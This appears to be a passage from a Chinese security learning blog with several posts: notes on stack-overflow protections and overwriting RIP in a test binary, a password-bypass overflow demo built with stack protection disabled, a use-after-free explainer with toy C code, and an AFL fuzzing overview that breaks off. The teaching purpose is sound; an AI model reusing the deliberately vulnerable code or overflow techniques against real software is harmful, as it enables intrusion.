<p>学习下相关的保护机制，<code>checksec</code>工具可以来检查各个保护机制是否打开</p>
<p><img src="/2018/10/28/栈溢出学习笔记/1.PNG" alt=""></p>
<p>依次来看看上图中的各个保护机制，这个具体可参考（<a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">上善若水的博客</a>），下面应用一部分当学习笔记记录吧：</p>
<ul>
<li><p><code>CANNARY</code>(栈保护)：上图中表示栈保护功能开启，栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让自己已经设计好的<code>shellcode</code>得到执行。而当启用栈保护后，函数开始执行的时候会先往栈里插入<code>cookie</code>信息，当函数真正返回的时候会验证<code>cookie</code>信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将<code>cookie</code>信息给覆盖掉，导致栈保护检查失败而阻止<code>shellcode</code>的执行。在<code>Linux</code>中我们将<code>cookie</code>信息称为<code>CANARY</code>。</p>
</li>
<li><p><code>FORTIFY</code>:<code>FORTIFY</code>其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如<code>memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets</code>以及宽字符的变体。</p>
</li>
<li><p><code>NX(DEP)</code>:<code>NX</code>（<code>No-eXecute</code>）即为不可执行的意思，基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入<code>shellcode</code>时，程序会尝试在数据页面上执行指令，此时<code>CPU</code>就会抛出异常，而不是去执行恶意指令。</p>
<p>工作原理如图：</p>
<p><img src="/2018/10/28/栈溢出学习笔记/2.PNG" alt=""></p>
</li>
<li><p><code>PIE(ASLR)</code>:一般情况下<code>NX</code>（<code>Windows</code>平台上称其为<code>DEP</code>）和地址空间分布随机化（<code>ASLR</code>）会同时工作。内存地址随机化机制（<code>address space layout randomization</code>)，有以下三种情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure>
<p>可以防范基于<code>Ret2libc</code>方式的针对<code>DEP</code>的攻击。<code>ASLR</code>和<code>DEP</code>配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
</li>
<li><p><code>RELRO</code>:在<code>Linux</code>系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</p>
<p><code>GCC, GNU linker</code>以及<code>Glibc-dynamic linker</code>一起配合实现了一种叫做<code>relro</code>的技术: <code>read only relocation</code>。大概实现就是由linker指定binary的一块经过<code>dynamic linker</code>处理过 <code>relocation</code>之后的区域为只读.</p>
<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对<code>GOT（Global Offset Table）</code>攻击。<code>RELRO</code>为” <code>Partial RELRO</code>”，说明我们对<code>GOT</code>表具有写权限。</p>
</li>
</ul>
<p>在利用程序在编译之前我们首先要关闭系统的<code>ASLR</code> 方法，<code>checksec</code>如下 所以：</p>
<p><img src="/2018/10/28/栈溢出学习笔记/3.PNG" alt=""></p>
<p>接下来，我们要如何利用该程序的漏洞呢，所以要做的是覆盖返回地址，即覆盖掉栈中的返回地址，从而让指令寄存器去执行我之前设定好的<code>shellcode</code>,在之前，我们先看下该段代码的反汇编代码</p>
<p><img src="/2018/10/28/栈溢出学习笔记/4.PNG" alt=""></p>
<p>该段程序当<code>read()</code>将<code>400</code>字节复制到一个<code>80</code>字节的<code>buffer</code>时，显然存在缓冲区溢出，下面我们构造我们的<code>exp</code>,来看看是否能够覆盖<code>RIP</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">buf = <span class="string">""</span></span><br><span class="line">buf += <span class="string">"A"</span>*<span class="number">400</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"in.txt"</span>, <span class="string">"w"</span>)</span><br><span class="line">f.write(buf)</span><br></pre></td></tr></table></figure>
<p>我们将利用这个<code>exp</code>来创建一个含有400个”A” 字符的”<code>in.txt</code>“文件，并且将典例加载进gdb并将in.txt的内容重定向到典例中</p>
<p><img src="/2018/10/28/栈溢出学习笔记/6.PNG" alt=""></p>
<p>程序显然崩掉了，但是却没有覆盖到<code>RIP</code>,因为我们已覆盖的<code>RIP</code>带有一个无效地址，事实上我们没控制到<code>RIP</code>,为了控制<code>RIP</code>，我们需要用<code>0x0000414141414141</code>覆盖(代替)它，因此真正的目标是找到覆盖了<code>RIP</code>的偏移（带有一个非标准地址）。我们可以使用一种<code>cyclic</code>模板找到这个偏移，并且再次运行检查<code>RSP</code>的内容，最后便可以看到偏移</p>
<p><img src="/2018/10/28/栈溢出学习笔记/7.PNG" alt=""></p>
<p>因此,<code>RIP</code>在偏移<code>104</code>上.让我们重新构造我们的<code>exp</code>并看看我们这次是否可以覆盖<code>RIP</code>:</p>
<p><img src="/2018/10/28/栈溢出学习笔记/8.PNG" alt=""></p>
<p>很棒,我们已经彻底控制了RIP。最后，我们可以继续构造我们的<code>shellcode</code>。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/逆向/">逆向</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/10/21/栈溢出浅析/"><span>栈溢出浅析</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/10/21/栈溢出浅析/" rel="bookmark">
        <time class="entry-date published" datetime="2018-10-21T04:00:31.000Z">
          2018-10-21
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p><code>To be the apostrophe which changed“ Impossible” into“ I’ m possible”</code>                                <code>——Failwest</code></p>
<h3 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h3><p>每周末最起码得写点东西吧，算是给自己的笔记吧，要不然怎么对得起这两天<code>free time</code>呢! 所以这篇就诞生了：）</p>
<h3 id="二-系统栈的工作原理"><a href="#二-系统栈的工作原理" class="headerlink" title="二.系统栈的工作原理"></a>二.系统栈的工作原理</h3><p>先扔图，网上看到了张图，觉得很形象很生动很详细了</p>
<p><img src="/2018/10/21/栈溢出浅析/linux-memory-segment.jpg" alt=""></p>
<p>依据图中，我们先来看看内存的功能吧。根据不同的操作系统，一个进程可能被分配到不同的内存区域去执行。但是不管什么样的操作系统、什么样的计算机架构，进程使用的内存都可以按照功能大致分成以下 4 个部分。</p>
<ul>
<li>代码区：这个区域存储着被装入执行的二进制机器代码，处理器会到这个区域取指并执行。</li>
<li>数据区：用于存储全局变量等。</li>
<li>堆区：进程可以在堆区动态地请求一定大小的内存，并在用完之后归还给堆区。动态分配和回收是堆区的特点。  </li>
<li>栈区：用于动态地存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行。</li>
</ul>
<blockquote>
<p>   这种简单的内存划分方式是为了让您能够更容易地理解程序的运行机制。</p>
</blockquote>
<p>为了更好的理解进程的内存使用，我们来贴出<code>0day</code>书上的这个图吧</p>
<p><img src="/2018/10/21/栈溢出浅析/memory.PNG" alt=""></p>
<p>在了解了内存相关知识后，接下来，我们再来看看栈，栈是一个数据结构，可以添加或者删除数据，但是得遵循“后进先出的原则，它是通过<code>push</code>操作来把数据压入栈中，通过<code>pop</code>操作删除数据。栈可以实现为一个数组，总是从数组的一端插入和删除元素。</p>
<p>我们来看0day中的一个<code>demo</code>，甩出代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">intfunc_B(<span class="keyword">int</span> arg_B1, <span class="keyword">int</span> arg_B2)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">int</span> var_B1, var_B2;</span><br><span class="line"> var_B1=arg_B1+arg_B2;</span><br><span class="line"> var_B2=arg_B1-arg_B2;</span><br><span class="line"> <span class="keyword">return</span> var_B1*var_B2;</span><br><span class="line">&#125;</span><br><span class="line">intfunc_A(<span class="keyword">int</span> arg_A1, <span class="keyword">int</span> arg_A2)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">int</span> var_A;</span><br><span class="line"> var_A = func_B(arg_A1,arg_A2) + arg_A1 ;</span><br><span class="line"> <span class="keyword">return</span> var_A;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">int</span> var_main;</span><br><span class="line"> var_main=func_A(<span class="number">4</span>,<span class="number">3</span>);</span><br><span class="line"> <span class="keyword">return</span> var_main;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们来看看该函数在代码区中的分布示意图，甩图</p>
<p><img src="/2018/10/21/栈溢出浅析/code.PNG" alt=""></p>
<p>当 CPU 在执行调用 <code>func_A</code> 函数的时候，会从代码区中 <code>main</code> 函数对应的机器指令的区域跳转到 <code>func_A</code> 函数对应的机器指令区域，在那里取指并执行；当 <code>func_A</code> 函数执行完闭，需要返回的时候，又会跳回到 <code>main</code> 函数对应的指令区域，紧接着调用 <code>func_A</code> 后面的指令继续执行<code>main</code> 函数的代码。来看看取指轨迹示意图：</p>
<p><img src="/2018/10/21/栈溢出浅析/3.PNG" alt=""></p>
<p>这些代码区中精确的跳转都是在于系统栈巧妙地配合过程中完成的，当函数被调用时，系统栈会为这个函数开辟一个新的栈帧，并把它压入栈中。这个栈帧中的内存空间被它所属的函数独占，正常情况下是不会和别的函数共享的。当函数返回时，系统栈会弹出该函数所对应的栈帧。那在调用函数的过程中，伴随的系统栈中的操作如下：</p>
<p><img src="/2018/10/21/栈溢出浅析/4.PNG" alt=""></p>
<p>程序的运行中每一个函数独占自己的栈帧空间，并且正在运行的函数的栈帧总是在栈顶，<code>win32</code>系统提供两个特殊的寄存器用于标识位于系统栈顶端的栈帧。</p>
<ul>
<li><code>ESP</code>：栈指针寄存器(<code>extended stack pointer</code>)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</li>
<li><code>EBP</code>：基址指针寄存器(<code>extended base pointer</code>)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。   </li>
</ul>
<p>寄存器对栈帧的标识作用如图：</p>
<p><img src="/2018/10/21/栈溢出浅析/5.PNG" alt=""></p>
<p> 函数栈帧： <code>ESP</code> 和 <code>EBP</code> 之间的内存空间为当前栈帧， <code>EBP</code> 标识了当前栈帧的底部， <code>ESP</code>标识了当前栈帧的顶部。</p>
<p>而在函数栈帧中，一般包含以下几类重要信息：</p>
<ul>
<li>局部变量：为函数局部变量开辟的内存空间。</li>
<li>保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡计算得到），用于在本帧被弹出后恢复出上一个栈帧。   </li>
<li>函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置，以便在函数返回时能够恢复到函数被调用前的代码区中继续执行指令。   </li>
</ul>
<p>除了与栈相关的寄存器外，还有另一个至关重要的寄存器。</p>
<p><code>EIP</code>：指令寄存器(<code>Extended Instruction Pointer</code>)，其内存放着一个指针，该指针永远指向下一条等待执行的指令地址。</p>
<p>那从安全角度，<code>EIP</code>就很有意思，可以说如果控制了 EIP 寄存器的内容，就控制了进程。</p>
<p>最后，直接甩图函数调用的实现：</p>
<p><img src="/2018/10/21/栈溢出浅析/6.PNG" alt=""></p>
<h3 id="三-一个简单实例"><a href="#三-一个简单实例" class="headerlink" title="三.一个简单实例"></a>三.一个简单实例</h3><p>说干就干，甩代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">"1234567"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span> <span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">int</span> authenticated;</span><br><span class="line"> <span class="keyword">char</span> buffer[<span class="number">8</span>];         <span class="comment">// add local buffto be overflowed</span></span><br><span class="line"> authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line"> <span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!</span></span><br><span class="line"> <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line"> <span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line"> <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"please input password: "</span>);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%s"</span>,password);</span><br><span class="line"> valid_flag = verify_password(password);</span><br><span class="line"> <span class="keyword">if</span>(valid_flag)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"incorrect password!\n\n"</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Congratulation! You have passed the verification!\n"</span>);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是一个密码验证程序，来看一下该程序的栈帧布局：</p>
<p><img src="/2018/10/21/栈溢出浅析/7.PNG" alt=""></p>
<p>正常来讲当我输入设定好的 <code>&quot;1234567&quot;</code>时，会验证通过；但是该程序段<code>strcpy(buffer,password)</code>存在栈溢出漏洞， 当输入的<code>password`</code>大于7个字符<code>时会让buffer[8]数组越界，</code>buffer[8]，<code></code>buffer[9]<code>，</code>buffer[10]<code>，</code>buffer[11]<code>等......将写入相邻的变量</code>authenticated<code>中，进而越界字符的</code>ASCII<code>码会修改</code>authenticated<code>的值，从程序中就可以看到</code>authenticated<code>变量的值来源于</code>strcmp<code>函数的返回值，之后会返回给</code>main<code>函数作为密码验证成功与否的标志变量：当</code>authenticated` 为 0 时，表示验证成功；反之，验证不成功。那如果这段溢出数据恰好把 authenticated 改为0，则程序流程将被改变。</p>
<p>我们首先来编译改程序，记得关闭<code>linux</code>的栈保护机制</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o stack1 stack.c						// 默认情况下，不开启Canary保护</span><br><span class="line">gcc -fno-stack-protector -o stack1 stack.c  //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o stack1 stack.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o stack1 stack.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>
<p><img src="/2018/10/21/栈溢出浅析/8.PNG" alt=""></p>
<p>我们根据这个程序的漏洞来输入<code>&quot;qqqqqqqq&quot;</code>时，来看运行结果：</p>
<p><img src="/2018/10/21/栈溢出浅析/9.PNG" alt=""></p>
<p>同样，通过验证。此时，我们可以分析到该栈帧数据：</p>
<table>
<thead>
<tr>
<th>局部变量名</th>
<th>内存地址</th>
<th>偏移 3 处的值</th>
<th>偏移 2 处的值</th>
<th>偏移 1 处的值</th>
<th>偏移 0 处的值</th>
</tr>
</thead>
<tbody>
<tr>
<td>buffer[8]</td>
<td>0x0012FB18</td>
<td>0x71 (‘q’)</td>
<td>0x71 (‘q’)</td>
<td>0x71 (‘q’)</td>
<td>0x71 (‘q’)</td>
</tr>
<tr>
<td></td>
<td>0x0012FB1C</td>
<td>0x71 (‘q’)</td>
<td>0x71 (‘q’)</td>
<td>0x71 (‘q’)</td>
<td>0x71 (‘q’)</td>
</tr>
<tr>
<td>authenticated 被覆盖前</td>
<td>0x0012FB20</td>
<td>0x00</td>
<td>0x00</td>
<td>0x00</td>
<td><code>0x01</code></td>
</tr>
<tr>
<td>authenticated 被覆盖后</td>
<td>0x0012FB20</td>
<td>0x00</td>
<td>0x00</td>
<td>0x00</td>
<td><code>0x00</code></td>
</tr>
</tbody>
</table>
<p>故而我们即使不知道正确的密码“ 1234567”，只要输入一个为<code>8</code> 个字符的字符串，那么字符串中隐藏的第 9 个截断符 <code>NULL</code> 就应该能够将 authenticated 低字节中的 <code>1</code> 覆盖成 <code>0</code>，从而绕过验证程序！</p>
<blockquote>
<p>严格说来，并不是任何 8 个字符的字符串都能冲破上述验证程序。由代码中的 <code>authenticated=strcmp(password,PASSWORD)</code>，我们知道 <code>authenticated</code> 的值来源于字符串比较函数 <code>strcmp</code> 的返回值。按照字符串的序关系，当输入的字符串大于<code>&quot;1234567&quot;</code>时，返回 <code>1</code>，这时 <code>authenticated</code>在内存中的值为 <code>0x00000001</code>，可以用字串的截断符 <code>NULL</code>淹没 <code>authenticated</code> 的低位字节而突破验证；当输入字符串小于<code>&quot;1234567&quot;</code>时（例如，<code>&quot;0123&quot;</code>等字符串），函数返回<code>-1</code>，这时 <code>authenticated</code> 在内存中的值按照双字<code>-1</code> 的补码存放，为 <code>0xFFFFFFFF</code>，如果这时也输入 <code>8</code> 个字符的字符串，截断符淹没 <code>authenticated</code>低字节后，其值变为 <code>0xFFFFFF00</code>，所以这时是不能冲破验证程序的。 </p>
</blockquote>
<h3 id="四-参考"><a href="#四-参考" class="headerlink" title="四.参考"></a>四.参考</h3><p>【1】0day 第二版</p>
<p>【2】<a href="https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
<p><code>Finally!</code></p>
<p><img src="/2018/10/21/栈溢出浅析/do.PNG" alt=""></p>
<p>### </p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/逆向/">逆向</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/10/07/Use-After-Free漏洞浅析/"><span>Use After Free漏洞浅析</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/10/07/Use-After-Free漏洞浅析/" rel="bookmark">
        <time class="entry-date published" datetime="2018-10-07T04:20:53.000Z">
          2018-10-07
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h3 id="一：前言"><a href="#一：前言" class="headerlink" title="一：前言"></a>一：前言</h3><p>最近一直在研究浏览器相关的的漏洞，其中很多漏洞都是UAF，很多相关CTF的题也是关于该漏洞的，所以趁着国庆假期间，来捋一捋该方面的东西，谈谈自己对Use After Free漏洞的理解和漏洞原理的解析。</p>
<h3 id="二：UAF介绍"><a href="#二：UAF介绍" class="headerlink" title="二：UAF介绍"></a>二：UAF介绍</h3><p>UAF (Use After Free)漏洞是一种内存破坏漏洞,通常存在于浏览器中。该漏洞也称为”释放即<code>free()</code>后重引用”漏洞，触发漏洞在于”重引用”这一步，而重引用之前要通过”占坑”方式来修改要”重引用”的指针对应内存中的数据，然后”重引用”到已经变化了的构造好的数据，导致执行任意代码。</p>
<blockquote>
<p>即使浏览器的新版本加入了一系列控件与机制，使得利用这些漏洞变得更加困难。但是它们似乎仍然存在。</p>
</blockquote>
<h3 id="三：UAF漏洞原理"><a href="#三：UAF漏洞原理" class="headerlink" title="三：UAF漏洞原理"></a>三：UAF漏洞原理</h3><p>首先我们先从hello word 开始：）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mian</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p0;</span><br><span class="line">    p0=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);   <span class="comment">//指针p0申请内存；</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p0,<span class="string">"hello"</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p0 Addr:%x,%s\n"</span>,p0,p0);      <span class="comment">//打印其地址与值；</span></span><br><span class="line">    <span class="built_in">free</span>(p0);                             <span class="comment">//释放p0；</span></span><br><span class="line">    <span class="keyword">char</span> *p1;</span><br><span class="line">    p1==(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(p1,<span class="string">"word"</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p1 Addr:%x,%s\n"</span>,p1,p0);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接编译并运行如下图：</p>
<p><img src="/2018/10/07/Use-After-Free漏洞浅析/a.out.PNG" alt=""></p>
<p>通过该段代码我们可以知道<code>UAF</code>的利用过程：</p>
<ol>
<li>指针p0申请了一段空间，最后并将其释放，但在释放之后并不将指针置为空，故而该指针仍然可以使用p0指针；</li>
<li>申请空间p1，由于<code>malloc</code>分配的过程使得p1指向的空间为刚刚释放的p0指针的空间，构造恶意的数据将这段内存空间布局好，即覆盖了p0中的数据；</li>
<li>由代码可以看到p0与p1的地址是相同的，p0与p1指向的内存为同一地址，所以此时的数据即是我们可控制的；</li>
</ol>
<h3 id="四：利用场景"><a href="#四：利用场景" class="headerlink" title="四：利用场景"></a>四：利用场景</h3><p>后续。。。</p>
<h3 id="五：参考"><a href="#五：参考" class="headerlink" title="五：参考"></a>五：参考</h3><p>【1】<a href="https://www.cnblogs.com/alert123/p/4918041.html" target="_blank" rel="noopener">https://www.cnblogs.com/alert123/p/4918041.html</a></p>
<p>【2】<a href="https://www.anquanke.com/post/id/84359" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84359</a></p>
<p>【3】<a href="https://www.anquanke.com/post/id/85281" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85281</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/逆向/">逆向</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/10/07/AFL漫谈/"><span>AFL漫谈</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/10/07/AFL漫谈/" rel="bookmark">
        <time class="entry-date published" datetime="2018-10-07T03:55:22.000Z">
          2018-10-07
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>最近一直在研究fuzz 神器-AFL，但网上的相关资料相对甚少，所以就抽空简略的撸了下源码来了解相对细节的实现的过程以及其中的巧妙之处，所以想写些东西来记录下。</p>
<p><strong>一，AFL 简介</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AFL(American Fuzzy Lop)是一款开源的fuzzing工具，并且其中巧妙的采用了一个极其简单但是绝对可靠的，插桩代码导向的遗传算法来提升fuzz效率，而他的巧妙之点不止只体现在这一点上。最近我对其代码进行了简要的阅读，大致总结了一些AFL的实现细节以及其中的遗传算法的原理，在这来记录整理。</span><br></pre></td></tr></table></figure>
<p><strong>二，AFL的整个算法逻辑</strong></p>
<p>参考的官网的相关技术白皮书，抛出链接<a href="http://lcamtuf.coredump.cx/afl/technical_details.txt" target="_blank" rel="noopener">http://lcamtuf.coredump.cx/afl/technical_details.txt</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Simplifying a bit, the overall algorithm can be summed up as:</span><br><span class="line">  1) Load user-supplied initial test cases into the queue,</span><br><span class="line">  2) Take next input file from the queue,</span><br><span class="line">  3) Attempt to trim the test case to the smallest size that doesn&apos;t alter</span><br><span class="line">     the measured behavior of the program,</span><br><span class="line">  4) Repeatedly mutate the file using a balanced and well-researched variety</span><br><span class="line">     of traditional fuzzing strategies,</span><br><span class="line">  5) If any of the generated mutations resulted in a new state transition</span><br><span class="line">     recorded by the instrumentation, add mutated output as a new entry in the</span><br><span class="line">     queue.</span><br><span class="line">  6) Go to 2.</span><br></pre></td></tr></table></figure>
<p>实现的具体流程图如下：</p>
<p><img src="/2018/10/07/AFL漫谈/liuc.PNG" alt=""></p>
<p><strong>三，AFL的整体框架</strong></p>
<p><strong><code>AFL的fuzz具体代码实现流程</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. main函数先进行初始化和选项处理；</span><br><span class="line">2. 执行input文件夹下的预先准备的所有testcase（perform_dry_run），生成初始化的queue和bitmap；</span><br><span class="line">3. 通过cull_queue对queue进行精选，减小input的量；</span><br><span class="line">4. 然后进行while(1)循环不断进行fuzz。</span><br><span class="line">每次在fuzz一个queue后，就会进入while(1),并重新调用cull_queue()对队列进行精选，而在while(1)具体实现以下过程：</span><br><span class="line">1. cull_queue()根据top_rated设置queue中的favored标志，对queue进行精选，选出favored；</span><br><span class="line">2. 判断queue_cur是否为NULL，如果是，则表示已经完成对队列的遍历，queue_cycle++,初始化相关参数，重新开始遍历队列；</span><br><span class="line">3. fuzz queue_cur对应的input文件；</span><br><span class="line">4. 判断是否结束，并更新queue_cur和current_entry；</span><br><span class="line">当队列中的所有文件都经过变异测试了，则完成一次”cycle done”; </span><br><span class="line">整个队列又会从第一个文件开始，再次继续进行变异，不过与第一次变异不同的是，因为没有随机性，这一次变异就不需要再进行deterministic fuzzing了。而至于什么是deterministic fuzzing，我们在下面的fuzz策略中会作介绍；</span><br></pre></td></tr></table></figure>
<p><strong><code>AFL的fuzz策略</code></strong></p>
